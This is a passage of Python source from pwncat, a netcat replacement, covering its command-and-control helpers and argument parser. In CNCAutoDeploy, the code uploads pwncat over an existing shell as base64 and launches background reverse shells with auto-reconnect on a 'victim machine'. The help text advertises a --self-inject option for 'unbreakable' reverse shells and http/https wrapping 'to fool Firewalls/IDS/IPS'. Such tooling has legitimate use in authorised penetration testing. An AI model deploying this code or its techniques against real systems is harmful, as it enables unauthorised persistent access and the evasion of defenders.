            line = line.lstrip(b"\n")
            line = line.lstrip(b"\r")
            if b"\r\n" in line:
                for newline in line.split(b"\r\n"):
                    normalized.append(newline)
            elif b"\n" in line:
                for newline in line.split(b"\n"):
                    normalized.append(newline)
            elif b"\r" in line:
                for newline in line.split(b"\r"):
                    normalized.append(newline)
            else:
                normalized.append(line)
        responses = normalized
        self.__log.debug("Normalize recv after  (2): %s", repr(responses))

        # [3/4] Remove remote ends suffix (if it sends something like it)
        # We iterate reversed of responses and check if the new line suffix(es)
        # are present at the end.
        # This is because the suffix(es) is always received last.
        if self.__remote_suffix and strip_suffix:
            # If multiple suffix lines are send we will first strip x-1 suffix lines
            if len(self.__remote_suffix) > 1:
                lines_to_strip = len(self.__remote_suffix) - 1
                self.__log.debug("Remove suffix before (1): %s", repr(responses))
                responses = responses[:-lines_to_strip]
                self.__log.debug("Remove suffix after  (1): %s", repr(responses))

            # Return if already empty
            if not responses:
                return responses

            # Clean up the last response line with first suffix line
            self.__log.debug("Remove suffix before (2): %s", repr(responses))
            responses[-1] = responses[-1].rstrip(self.__remote_suffix[0])
            self.__log.debug("Remove suffix after  (2): %s", repr(responses))

            # Ensure empty elements are removed
            self.__log.debug("Remove suffix before (3): %s", repr(responses))
            responses = [item for item in responses if item]
            self.__log.debug("Remove suffix after  (3): %s", repr(responses))

        # [4/4] Some server also echo back what we've send, so if we did send something
        # we need to strip this off as well
        if data is not None and strip_echo:
            for idx, item in enumerate(responses):
                if data in responses[idx]:
                    del responses[idx]
                elif data.rstrip() in responses[idx]:
                    del responses[idx]
                # Ensure empty elements are removed
                responses = [item for item in responses if item]

        # Return list of respones
        return responses

    # --------------------------------------------------------------------------
    # High-level Functions
    # --------------------------------------------------------------------------
    def remote_command(self, command, output):
        # type: (str, bool) -> Optional[List[bytes]]
        """Run remote command with correct linefeeds and receive response lines.

        Args:
            command (str): The command to execute on the remote end.
            output (bool): Receive output from command?
        """
        command = command.rstrip("\r\n")
        command = command.rstrip("\r")
        command = command.rstrip("\n")
        command = command + "\n"
        if output:
            return self.send_recv(StringEncoder.encode(command), True, True)
        self.send(StringEncoder.encode(command))
        return None

    def create_remote_tmpfile(self):
        # type: () -> Optional[str]
        """OS-independent remote tempfile creation.

        Returns:
            str or None: Returns path on success or None on error.
        """
        self.flush_receive()
        self.print_info("Creating tmpfile:", False, True)

        command = []
        command.append("{} -c '".format(self.__remote_python))
        command.append("import tempfile;")
        command.append("h,f=tempfile.mkstemp();")
        if self.__remote_py3:
            command.append("print(f);")
        else:
            command.append("print f;")
        command.append("'")
        response = self.remote_command("".join(command), True)

        # All good
        if response is not None and len(response) == 1:
            tmpfile = StringEncoder.decode(response[0]).rstrip()
            self.print_info("Creating tmpfile: {}".format(repr(tmpfile)), True, True)
            return tmpfile

        # Something went wrong with stripping prefix from server, we need to manually
        # check if creation was successful.
        if response is not None and len(response) > 1:
            # A bit fuzzy, but we try a few times
            for _ in range(5):
                self.print_info("Creating tmpfile: Unsure - checking otherwise", True, True)
                for candidate in response:
                    tmpfile = StringEncoder.decode(candidate).rstrip()
                    if self.remote_file_exists(tmpfile):
                        self.print_info("Creating tmpfile: {}".format(repr(tmpfile)), True, True)
                        return tmpfile

        self.print_info("Creating tmpfile: Failed", True, True)
        self.print_info("Response: {}".format(repr(response)))
        return None

    def remote_file_exists(self, remote_path):
        # type: (str) -> bool
        """Ensure given remote path exists as a file on remote end.

        Args:
            remote_path (str): Path of file to check.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        self.flush_receive()

        # String should be short as an unstable remote might send small chunks
        unique_string = "_pwncat_"
        response = self.remote_command(
            'test -f "{}" && echo "{}"'.format(remote_path, unique_string), True
        )
        if response is not None:
            for candidate in response:
                if StringEncoder.decode(candidate) == unique_string:
                    return True
                if StringEncoder.decode(candidate).rstrip() == unique_string:
                    return True
        response = self.flush_receive()
        if response is not None:
            for candidate in response:
                if StringEncoder.decode(candidate).rstrip() == unique_string:
                    return True
                if StringEncoder.decode(candidate).rstrip() == unique_string:
                    return True
        return False

    def upload(self, lpath, rpath):
        # type: (str, str) -> bool
        """OS-independent upload of a local file to a remote path.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        assert self.__remote_python is not None
        assert self.__remote_py3 is not None

        rpath_b64 = self.create_remote_tmpfile()
        self.flush_receive()
        if rpath_b64 is None:
            return False
        if not self.__upload_file_base_64_encoded(lpath, rpath_b64, True):
            return False
        if not self.__remote_base64_decode(rpath_b64, rpath):
            return False
        return True

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    def __set_remote_prefix(self):
        # type: () -> None
        """Determines if the remote always sends a specific prefix with its other data."""
        self.__remote_prefix = []
        self.__remote_suffix = []

        has_suffix = False

        self.print_info("Checking if remote sends prefix/suffix to every request...")
        response = self.send_recv(b'echo "__pwn__"\n')
        expected = b"__pwn__"

        if response:
            for line in response:
                # If the line begins with our expected response, all data after that
                # is a suffix that the server might be sending.
                if re.match(expected, line):
                    has_suffix = True
                    # If bytes are still left after our response, add it
                    if line.replace(expected, b"", 1):
                        self.__remote_suffix.append(line.replace(expected, b"", 1))
                    continue
                if has_suffix:
                    self.__remote_suffix.append(line)

        # Ensure empty elements are removed
        self.__log.debug("Set suffix before: %s", repr(self.__remote_suffix))
        self.__remote_suffix = [item for item in self.__remote_suffix if item]
        self.__log.debug("Set suffix after:  %s", repr(self.__remote_suffix))

        if self.__remote_prefix:
            self.print_info("Remote prefix ({} lines):".format(len(self.__remote_prefix)))
            for line in self.__remote_prefix:
                self.print_raw(repr(line).encode(), True)
        else:
            self.print_info("Remote does not send prefix")
        if self.__remote_suffix:
            self.print_info("Remote suffix ({} lines):".format(len(self.__remote_suffix)))
            for line in self.__remote_suffix:
                self.print_raw(repr(line).encode(), True)
        else:
            self.print_info("Remote does not send suffix")

    def __get_remote_python_version(self, path):
        # type: (str) -> Optional[str]
        """Get remote Python version by path.

        Args:
            path (str): Path to potential python binary.

        Returns:
            Optional[str]: Python version string or None if not found.
        """
        command = []
        command.append("{} -c '".format(path))
        command.append("from __future__ import print_function;")
        command.append("import sys;")
        command.append("v=sys.version_info;")
        command.append('print("{}.{}.{}".format(v[0], v[1], v[2]));\'')

        response = self.remote_command("".join(command), True)

        if response is not None and response:
            for line in response:
                match = re.search(b"^([.0-9]+)", line)
                # Potential version candidate
                if match:
                    version = StringEncoder.decode(match.group(1))
                    if version[0] in ["2", "3"]:
                        return version
        return None

    def __set_remote_python_path(self):
        # type: () -> bool
        """Enumerate remote Python binary.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        # TODO: Make windows compatible
        # [1/2] 'which' method
        for name in self.__PYTHON_NAMES:
            self.print_info("Probing for: which {}".format(name))
            response = self.remote_command("which {} 2>/dev/null".format(name), True)
            if response is not None and response:
                for line in response:
                    path = StringEncoder.decode(line)
                    self.print_info("Potential path: {}".format(path))
                    version = self.__get_remote_python_version(path)
                    if version is None:
                        continue

                    if version[0] == "2":
                        self.__remote_py3 = False
                    if version[0] == "3":
                        self.__remote_py3 = True
                    self.print_info("Found valid Python{} version: {}".format(version[0], version))
                    self.__remote_python = path
                    return True

        # TODO: Make windows compatible
        # [2/2] Absolute path method
        for path in self.__PYTHON_PATHS:
            for name in self.__PYTHON_NAMES:

                python = path + "/" + name
                self.print_info("Probing for: {}".format(python))
                rpath_lines = self.remote_command(
                    "test -f {p} && echo {p} || echo".format(p=python), True
                )
                if rpath_lines is not None and rpath_lines:
                    # Reset current round
                    path_found = False

                    # We expect a length of one, but we handle errors as well.
                    for rpath_line in rpath_lines:
                        if StringEncoder.decode(rpath_line).rstrip() == python:
                            path_found = True
                            break
                    if not path_found:
                        continue

                    # Potential python candidate
                    self.print_info("Potential path: {}".format(python))
                    version = self.__get_remote_python_version(python)
                    if version is None:
                        continue

                    if version[0] == "2":
                        self.__remote_py3 = False
                    if version[0] == "3":
                        self.__remote_py3 = True
                    self.print_info("Found valid Python{} version: {}".format(version[0], version))
                    self.__remote_python = python
                    return True
        return False

    def __upload_file_base_64_encoded(self, lpath, rpath, at_once=False):
        # type: (str, str, bool) -> bool
        """Upload a local file to a base64 encoded remote file.

        Args:
            lpath (str): Local path of the file.
            rpath (str): Remote path, where to upload the base64 encoded file.
            at_once (bool): Send all data at once.

        Returns:
            bool: Returns `True` on success and `False` on failure.
        """
        first = True
        data = []  # type: List[str]

        with open(lpath, "r") as fhandle:
            lines = fhandle.readlines()
            count = len(lines)
            curr = 1
            for line in lines:
                if not at_once:
                    self.print_info(
                        "Uploading: {} -> {} ({}/{})".format(lpath, rpath, curr, count), False, True
                    )
                b64 = StringEncoder.decode(base64.b64encode(StringEncoder.encode(line)))
                if first:
                    if at_once:
                        data.append('echo "{}" > "{}"'.format(b64, rpath))
                    else:
                        self.remote_command('echo "{}" > "{}"'.format(b64, rpath), False)
                    first = False
                else:
                    if at_once:
                        data.append('echo "{}" >> "{}"'.format(b64, rpath))
                    else:
                        self.remote_command('echo "{}" >> "{}"'.format(b64, rpath), False)
                curr += 1

        if at_once:
            self.print_info("Uploading: {} -> {} ({}/{})".format(lpath, rpath, 1, 1))
            self.remote_command("\n".join(data), False)
        else:
            self.print_info()

        # TODO: md5 check if this is legit
        return True

    def __remote_base64_decode(self, rpath_source, rpath_target):
        # type: (str, str) -> bool
        """Decode a remote base64 encoded file with pure Python.

        Args:
            rpath_source (str): The remote path to the existing base64 encoded file.
            rpath_target (str): The remote path to the desired base64 decoded file.

        Returns:
            bool: Returns `True` on success or `False` on failure.
        """
        self.flush_receive()

        command = []
        command.append("{} -c 'import base64;".format(self.__remote_python))
        command.append('f=open("{}", "r");'.format(rpath_source))
        command.append("lines = f.readlines();")
        if self.__remote_py3:
            command.append(
                'print((b"".join([base64.b64decode(l.encode()) for l in lines])).decode());\''
            )
        else:
            command.append('print "".join([base64.b64decode(l) for l in lines]);\'')
        command.append('> "{}"'.format(rpath_target))

        self.print_info("Decoding: {} -> {}".format(rpath_source, rpath_target))
        self.remote_command("".join(command), False)
        # TODO: validate via md5
        return True


# -------------------------------------------------------------------------------------------------
# [9/11 Command & Control]: (3/3) CNCAutoDeploy
# -------------------------------------------------------------------------------------------------
class CNCAutoDeploy(CNC):
    """Command&Control pwncat auto deployment class."""

    def __init__(
            self,
            network,  # type: IONetwork
            cmd,  # type: str
            host,  # type: str
            ports,  # type: List[int]
    ):
        # type: (...) -> None
        try:
            super(CNCAutoDeploy, self).__init__(network)
        except CNCPythonNotFound:
            return

        local_path = os.path.abspath(__file__)
        remote_path = self.create_remote_tmpfile()
        remote_stdout = self.create_remote_tmpfile()
        remote_stderr = self.create_remote_tmpfile()
        if remote_path is None:
            self.print_info("Unable to create tmpfile. Aborting and handing over to current shell.")
            return
        if not self.upload(local_path, remote_path):
            self.print_info("Unable to upload file. Aborting and handing over to current shell.")
            return
        self.__start_pwncat(remote_path, cmd, host, ports, remote_stdout, remote_stderr)

        # We need to wait some time for slow severs
        self.print_info("Waiting for socket")
        time.sleep(2)
        self.flush_receive()

        self.print_info("Done. Handing over to current shell.")
        return

    def __start_pwncat(self, remote_path, binary, host, ports, stdout, stderr):
        # type: (str, str, str, List[int], Optional[str], Optional[str]) -> None
        for port in ports:
            command = []
            command.append("nohup")
            command.append(self.remote_python)
            command.append(remote_path)
            command.append(host)
            command.append(str(port))
            command.append("--exec {}".format(binary))
            command.append("--reconn")
            command.append("--reconn-wait 1")
            if stdout is not None and stderr is not None:
                command.append("> {}".format(stdout))
                command.append("2> {}".format(stderr))
            elif stdout is not None:
                command.append("> {} 2>&1".format(stdout))
            elif stderr is not None:
                command.append("> {} 2>&1".format(stderr))
            command.append("&")
            data = " ".join(command)
            print("Starting pwncat rev shell: {}".format(data))
            self.remote_command(data, False)


# #################################################################################################
# #################################################################################################
# ###
# ###   10 / 11   C O M M A N D   L I N E   A R G U M E N T S
# ###
# #################################################################################################
# #################################################################################################

# -------------------------------------------------------------------------------------------------
# [19/11 COMMAND LINE ARGUMENTS]: (1/2) Helper Functions
# -------------------------------------------------------------------------------------------------
def get_version():
    # type: () -> str
    """Return version information."""
    return """%(prog)s: Version %(version)s (%(url)s) by %(author)s""" % (
        {"prog": APPNAME, "version": VERSION, "url": APPREPO, "author": "cytopia"}
    )


class ArgValidator(object):
    """Validate command line arguments."""

    # --------------------------------------------------------------------------
    # Private Functions
    # --------------------------------------------------------------------------
    @staticmethod
    def __get_port_list_by_comma(value):
        # type: (str) -> List[int]
        """Returns a list of ports from a comma separated string or empty list if invalid."""
        ports = []
        match = re.search(r"^[0-9]+(,([0-9]+))*$", value)
        if match is not None:
            ports = [int(port) for port in match.group(0).split(",")]
            for port in ports:
                if not ArgValidator.is_valid_port(port):
                    return []
        return ports

    @staticmethod
    def __get_port_list_by_range(value):
        # type: (str) -> List[int]
        """Returns a list of ports from a range string or empty list if invalid."""
        ports = []  # type: List[int]
        match = re.search(r"^[0-9]+\-[0-9]+$", value)
        if match is not None:
            ranges = [int(r) for r in match.group(0).split("-")]
            ports = list(range(ranges[0], ranges[1] + 1))
            for port in ports:
                if not ArgValidator.is_valid_port(port):
                    return []
        return ports

    @staticmethod
    def __get_port_list_by_incr(value):
        # type: (str) -> List[int]
        """Returns a list of ports from an increment or empty list if invalid."""
        ports = []  # type: List[int]
        match = re.search(r"^[0-9]+\+[0-9]+$", value)
        if match is not None:
            ranges = [int(r) for r in match.group(0).split("+")]
            ports = list(range(ranges[0], ranges[0] + ranges[1] + 1))
            for port in ports:
                if not ArgValidator.is_valid_port(port):
                    return []
        return ports

    # --------------------------------------------------------------------------
    # Helper Functions
    # --------------------------------------------------------------------------
    @staticmethod
    def is_valid_port(value):
        # type: (int) -> bool
        """Returns True if a given value is a valid port."""
        return 0 < value < 65536

    @staticmethod
    def is_valid_port_list(value):
        # type: (str) -> bool
        """Returns True if a given value is a valid port list by comma or range."""
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        # XOR - only one method (comma, range or increment) is allowed
        if cports and not rports and not iports:
            return True
        if rports and not cports and not iports:
            return True
        if iports and not cports and not rports:
            return True
        return False

    @staticmethod
    def get_port_list_from_string(value):
        # type: (str) -> List[int]
        """Returns a list of ports from an comma, range or increment."""
        cports = ArgValidator.__get_port_list_by_comma(value)
        rports = ArgValidator.__get_port_list_by_range(value)
        iports = ArgValidator.__get_port_list_by_incr(value)
        return cports + rports + iports

    # --------------------------------------------------------------------------
    # Generic Type Functions
    # --------------------------------------------------------------------------
    @staticmethod
    def type_port(value):
        # type: (str) -> int
        """Check argument for valid port."""
        if not ArgValidator.is_valid_port(int(value)):
            raise argparse.ArgumentTypeError("%s is an invalid port number." % value)
        return int(value)

    @staticmethod
    def type_port_list(value):
        # type: (str) -> List[int]
        """Check argument for valid port list separated by comma or range number."""
        rports = ArgValidator.__get_port_list_by_range(value)
        cports = ArgValidator.__get_port_list_by_comma(value)
        iports = ArgValidator.__get_port_list_by_incr(value)

        # Only use comma, range or increment!
        if (rports and cports) or (rports and iports) or (cports and iports):
            raise argparse.ArgumentTypeError(
                "%s is invalid. Can only use comma, range or increment." % value
            )
        if not rports and not cports and not iports:
            raise argparse.ArgumentTypeError("%s is an invalid port-list/range definition." % value)
        # Return whichever has a value
        return rports + cports + iports

    @staticmethod
    def type_file_content(value):
        # type: (str) -> str
        """Check argument for valid file content (file must exist and be readable)."""
        if not os.path.isfile(value):
            raise argparse.ArgumentTypeError("File not found: %s" % value)
        with open(value, mode="r") as fhandle:
            script = fhandle.read()
        return script

    # --------------------------------------------------------------------------
    # Specific Type Functions
    # --------------------------------------------------------------------------
    @staticmethod
    def type_tos(value):
        # type: (str) -> str
        """Check argument for valid --tos value."""
        if value not in ["mincost", "lowcost", "reliability", "throughput", "lowdelay"]:
            raise argparse.ArgumentTypeError("%s is an invalid tos definition." % value)
        return value

    @staticmethod
    def type_info(value):
        # type: (str) -> str
        """Check argument for valid --info value."""
        if value not in ["sock", "ipv4", "ipv6", "tcp", "all", ""]:
            raise argparse.ArgumentTypeError("%s is an invalid info definition." % value)
        return value

    @staticmethod
    def type_crlf(value):
        # type: (Optional[str]) -> Optional[str]
        """Check argument for valid --crlf value."""
        if value is None:
            return None
        if value.lower() in ["crlf", "lf", "cr", "no"]:
            return value.lower()
        raise argparse.ArgumentTypeError("'%s' is an invalid choice." % value)

    @staticmethod
    def type_color(value):
        # type: (str) -> str
        """Check argument for valid --color value."""
        if value not in ["auto", "always", "never"]:
            raise argparse.ArgumentTypeError("%s is an invalid color definition." % value)
        return value

    @staticmethod
    def type_local(value):
        # type: (str) -> str
        """Check argument for valid -L/--local value."""
        match = re.search(r"^(.+:)?([0-9]+)$", value)
        if match is None or len(match.groups()) != 2:
            raise argparse.ArgumentTypeError("%s is not a valid '[addr:]port' format." % value)
        if not ArgValidator.is_valid_port(int(match.group(2))):
            raise argparse.ArgumentTypeError("%s is not a valid port." % value)

        if match.group(1) is None:
            return ":" + match.group(2)
        return value

    @staticmethod
    def type_remote(value):
        # type: (str) -> str
        """Check argument for valid -R/--remote value."""
        match = re.search(r"(.+):(.+)", value)
        if match is None or len(match.groups()) != 2:
            raise argparse.ArgumentTypeError("%s is not a valid 'addr:port' format." % value)
        if not ArgValidator.is_valid_port(int(match.group(2))):
            raise argparse.ArgumentTypeError("%s is not a valid port." % value)
        return value

    @staticmethod
    def type_self_inject(value):
        # type: (str) -> str
        """Check argument for valid --self-inject value."""
        opts = value.split(":")
        if len(opts) != 3:
            raise argparse.ArgumentTypeError("%s is not a valid cmd:host:port[s] pattern." % value)
        if not ArgValidator.is_valid_port_list(opts[-1]):
            raise argparse.ArgumentTypeError("%s is an invalid port definition." % value)
        return value


def _args_check_mutually_exclusive(parser, args):
    # type: (argparse.ArgumentParser, argparse.Namespace) -> None
    """Check mutually exclusive arguments."""
    # This is connect mode
    connect_mode = not args.listen and not args.zero and not args.local and not args.remote

    # [MODE] --listen
    if args.listen and (args.zero or args.local or args.remote):
        parser.print_usage()
        print(
            "%s: error: -l/--listen mutually excl. with -z/-zero, -L or -R" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE] --zero
    if args.zero and (args.listen or args.local or args.remote):
        parser.print_usage()
        print(
            "%s: error: -z/--zero mutually excl. with -l/--listen, -L or -R" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE]--local
    if args.local and (args.listen or args.zero or args.remote):
        parser.print_usage()
        print(
            "%s: error: -L/--local mutually excl. with -l/--listen, -z/--zero or -R" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODE] --remote
    if args.remote and (args.listen or args.zero or args.local):
        parser.print_usage()
        print(
            "%s: error: -R/--remote mutually excl. with -l/--listen, -z/--zero or -L" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [MODULE] --exec
    if args.cmd and (args.local or args.remote or args.zero):
        parser.print_usage()
        print(
            "%s: error: -e/--exec mutually excl. with -L, -R or -z/--zero" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [OPTIONS] -4 and -6
    if args.ipv4 and args.ipv6:
        parser.print_usage()
        print(
            "%s: error: -4 and -6 are mutually exclusive" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [OPTIONS] --source-addr/--source-port
    if not connect_mode and (args.source_port or args.source_addr):
        print(
            "%s: error: --source-addr and --source-port can only be used in connect mode."
            % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [OPTIONS] --source-addr/--source-port
    if (args.source_port and not args.source_addr) or (not args.source_port and args.source_addr):
        print(
            "%s: error: --source-addr and --source-port are both required." % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --http
    if args.http and (args.https or args.udp or args.zero):
        parser.print_usage()
        print(
            "%s: error: --http mutually excl. with --https, -u/--udp or -z/--zero" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --https
    if args.https and (args.http or args.udp or args.zero):
        parser.print_usage()
        print(
            "%s: error: --https mutually excl. with --http, -z/--udp or -z/--zero" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --keep-open
    if args.keep_open and (args.udp):
        parser.print_usage()
        print(
            "%s: error: --keep-open mutually excl. with -u/--udp" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)
    if args.keep_open and not args.listen:
        parser.print_usage()
        print(
            "%s: error: --keep-open only works with -l/--listen" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --reconn
    if args.reconn != 0 and not connect_mode:
        parser.print_usage()
        print(
            "%s: error: --reconn only works in connect mode" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --ping-init
    if args.ping_init is not False and (args.listen or args.local):
        parser.print_usage()
        print(
            "%s: error: --ping-init mutually excl. with -l/--listen or -L/--local" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)

    # [ADVANCED] --udp-sconnect
    if args.udp_sconnect and not connect_mode:
        parser.print_usage()
        print(
            "%s: error: --udp-sconnect only works in connect mode" % (APPNAME),
            file=sys.stderr,
        )
        sys.exit(1)


# -------------------------------------------------------------------------------------------------
# [10/11 COMMAND LINE ARGUMENTS]: (2/2) Argument Parser
# -------------------------------------------------------------------------------------------------
def get_args():
    # type: () -> argparse.Namespace
    """Retrieve command line arguments."""
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False,
        usage="""%(prog)s [options] hostname port
       %(prog)s [options] -l [hostname] port
       %(prog)s [options] -z hostname port
       %(prog)s [options] -L [addr:]port hostname port
       %(prog)s [options] -R addr:port hostname port
       %(prog)s -V, --version
       %(prog)s -h, --help
       """
              % ({"prog": APPNAME}),
        description="""
Enhanced and compatible Netcat implementation written in Python (2 and 3) with
connect, zero-i/o, listen and forward modes and techniques to detect and evade
firewalls and intrusion detection/prevention systems.

If no mode arguments are specified, pwncat will run in connect mode and act as
a client to connect to a remote endpoint. If the connection to the remote
endoint is lost, pwncat will quit. See options for how to automatically re-
connect.""",
    )

    positional = parser.add_argument_group("positional arguments")
    mode = parser.add_argument_group("mode arguments")
    optional = parser.add_argument_group("optional arguments")
    protocol = parser.add_argument_group("protocol arguments")
    cnc = parser.add_argument_group("command & control arguments")
    pse = parser.add_argument_group("pwncat scripting engine")
    zero = parser.add_argument_group("zero-i/o mode arguments")
    lmode = parser.add_argument_group("listen mode arguments")
    cmode = parser.add_argument_group("connect mode arguments")
    misc = parser.add_argument_group("misc arguments")

    # --------------------------------------------------------------------------
    # Positional arguments
    # --------------------------------------------------------------------------
    positional.add_argument(
        "hostname",
        nargs="?",
        type=str,
        help="""Address to listen, forward, scan or connect to.

""",
    )
    positional.add_argument(
        "port",
        type=ArgValidator.type_port_list,
        help="""[All modes]
Single port to listen, forward or connect to.
[Zero-I/O mode]
Specify multiple ports to scan:
Via list:  4444,4445,4446
Via range: 4444-4446
Via incr:  4444+2
""",
    )

    # --------------------------------------------------------------------------
    # Mode arguments
    # --------------------------------------------------------------------------
    mode.add_argument(
        "-l",
        "--listen",
        action="store_true",
        default=False,
        help="""[Listen mode]:
Start a server and listen for incoming connections.
If using TCP and a connected client disconnects or the
connection is interrupted otherwise, the server will
quit. See -k/--keep-open to change this behaviour.

""",
    )
    mode.add_argument(
        "-z",
        "--zero",
        action="store_true",
        default=False,
        help="""[Zero-I/0 mode]:
Connect to a remote endpoint and report status only.
Used for port scanning.
See --banner for version detection.

""",
    )
    mode.add_argument(
        "-L",
        "--local",
        metavar="[addr:]port",
        type=ArgValidator.type_local,
        default=False,
        help="""[Local forward mode]:
This mode will start a server and a client internally.
The internal server will listen locally on specified
addr/port (given by --local [addr:]port).
The server will then forward traffic to the internal
client which connects to another server specified by
hostname/port given via positional arguments.
(I.e.: proxies a remote service to a local address)

""",
    )
    mode.add_argument(
        "-R",
        "--remote",
        metavar="addr:port",
        type=ArgValidator.type_remote,
        default=False,
        help="""[Remote forward mode]:
This mode will start two clients internally. One is
connecting to the target and one is connecting to
another pwncat/netcat server you have started some-
where. Once connected, it will then proxy traffic
between you and the target.
This mode should be applied on machines that block
incoming traffic and only allow outbound.
The connection to your listening server is given by
-R/--remote addr:port and the connection to the
target machine via the positional arguments.
""",
    )

    # --------------------------------------------------------------------------
    # Optional arguments
    # --------------------------------------------------------------------------
    optional.add_argument(
        "-e",
        "--exec",
        metavar="cmd",
        type=str,
        default=False,
        dest="cmd",
        help="""Execute shell command. Only for connect or listen mode.

""",
    )
    # TODO: add --crlf-i and --crlf-o to only do this on input or output and have
    # --crlf to always do it on input and output!
    optional.add_argument(
        "-C",
        "--crlf",
        metavar="lf",
        type=ArgValidator.type_crlf,
        default=None,
        help="""Specify, 'lf', 'crlf' or 'cr' to always force replacing
line endings for input and outout accordingly. Specify
'no' to completely remove any line feeds. By default
it will not replace anything and takes what is entered
(usually CRLF on Windows, LF on Linux and some times
CR on MacOS).

""",
    )
    optional.add_argument(
        "-n",
        "--nodns",
        action="store_true",
        default=False,
        help="""Do not resolve DNS.

""",
    )
    optional.add_argument(
        "--send-on-eof",
        action="store_true",
        default=False,
        help="""Buffer data received on stdin until EOF and send
everything in one chunk.

""",
    )
    optional.add_argument(
        "--no-shutdown",
        action="store_true",
        default=False,
        help="""Do not shutdown into half-duplex mode.
If this option is passed, pwncat won't invoke shutdown
on a socket after seeing EOF on stdin. This is provided
for backward-compatibility with OpenBSD netcat, which
exhibits this behavior.

""",
    )
    optional.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="""Be verbose and print info to stderr. Use -v, -vv, -vvv
or -vvvv for more verbosity. The server performance will
decrease drastically if you use more than three times.

""",
    )
    optional.add_argument(
        "--info",
        metavar="type",
        type=ArgValidator.type_info,
        default=None,
        help="""Show additional info about sockets, IPv4/6 or TCP opts
applied to the current socket connection. Valid
parameter are 'sock', 'ipv4', 'ipv6', 'tcp' or 'all'.
Note, you must at least be in INFO verbose mode in order
to see them (-vv).

""",
    )
    optional.add_argument(
        "-c",
        "--color",
        metavar="str",
        type=ArgValidator.type_color,
        default="auto",
        help="""Colored log output. Specify 'always', 'never' or 'auto'.
In 'auto' mode, color is displayed as long as the output
goes to a terminal. If it is piped into a file, color
will automatically be disabled. This mode also disables
color on Windows by default. (default: auto)

""",
    )
    optional.add_argument(
        "--safe-word",
        metavar="str",
        type=str,
        default=None,
        help="""All modes:
If %(prog)s is started with this argument, it will shut
down as soon as it receives the specified string. The
--keep-open (server) or --reconn (client) options will
be ignored and it won't listen again or reconnect to you.
Use a very unique string to not have it shut down
accidentally by other input.
"""
             % ({"prog": APPNAME}),
    )

    # --------------------------------------------------------------------------
    # Protocol arguments
    # --------------------------------------------------------------------------
    protocol.add_argument(
        "-4",
        dest="ipv4",
        action="store_true",
        default=False,
        help="""Only Use IPv4 (default: IPv4 and IPv6 dualstack).

""",
    )
    protocol.add_argument(
        "-6",
        action="store_true",
        default=False,
        dest="ipv6",
        help="""Only Use IPv6 (default: IPv4 and IPv6 dualstack).

""",
    )
    protocol.add_argument(
        "-u",
        "--udp",
        action="store_true",
        default=False,
        help="""Use UDP for the connection instead of TCP.

""",
    )
    protocol.add_argument(
        "-T",
        "--tos",
        metavar="str",
        type=ArgValidator.type_tos,
        default=None,
        help="""Specifies IP Type of Service (ToS) for the connection.
Valid values are the tokens 'mincost', 'lowcost',
'reliability', 'throughput' or 'lowdelay'.

""",
    )
    protocol.add_argument(
        "--http",
        action="store_true",
        default=False,
        help="""Connect / Listen mode (TCP and UDP):
Hide traffic in http packets to fool Firewalls/IDS/IPS.

""",
    )
    protocol.add_argument(
        "--https",
        action="store_true",
        default=False,
        help="""Connect / Listen mode (TCP and UDP):
Hide traffic in https packets to fool Firewalls/IDS/IPS.

""",
    )
    protocol.add_argument(
        "-H",
        "--header",
        metavar="str",
        nargs="*",
        default=[],
        help="""Add HTTP headers to your request when using --http(s).""",
    )

    # --------------------------------------------------------------------------
    # Command & Control arguments
    # --------------------------------------------------------------------------
    cnc.add_argument(
        "--self-inject",
        metavar="cmd:host:port[s]",
        type=ArgValidator.type_self_inject,
        default=None,
        help="""Listen mode (TCP only):
If you are about to inject a reverse shell onto the
victim machine (via php, bash, nc, ncat or similar),
start your listening server with this argument.
This will then (as soon as the reverse shell connects)
automatically deploy and background-run an unbreakable
pwncat reverse shell onto the victim machine which then
also connects back to you with specified arguments.
Example: '--self-inject /bin/bash:10.0.0.1:4444'
It is also possible to launch multiple reverse shells by
specifying multiple ports.
Via list:  --self-inject /bin/sh:10.0.0.1:4444,4445,4446
Via range: --self-inject /bin/sh:10.0.0.1:4444-4446
Via incr:  --self-inject /bin/sh:10.0.0.1:4444+2
Note: this is currently an experimental feature and does
not work on Windows remote hosts yet.
""",
    )

    # --------------------------------------------------------------------------
    # PSE arguments
    # --------------------------------------------------------------------------
    pse.add_argument(
        "--script-send",
        metavar="file",
        type=ArgValidator.type_file_content,
        default=None,
        help="""All modes (TCP and UDP):
A Python scripting engine to define your own custom
transformer function which will be executed before
sending data to a remote endpoint. Your file must
contain the exact following function which will:
be applied as the transformer:
def transform(data, pse):
    # NOTE: the function name must be 'transform'
    # NOTE: the function param name must be 'data'
    # NOTE: indentation must be 4 spaces
    # ... your transformations goes here
    return data
You can also define as many custom functions or classes
within this file, but ensure to prefix them uniquely to
not collide with pwncat's function or classes, as the
file will be called with exec().

""",
    )
    pse.add_argument(
        "--script-recv",
        metavar="file",
        type=ArgValidator.type_file_content,
        default=None,
        help="""All modes (TCP and UDP):
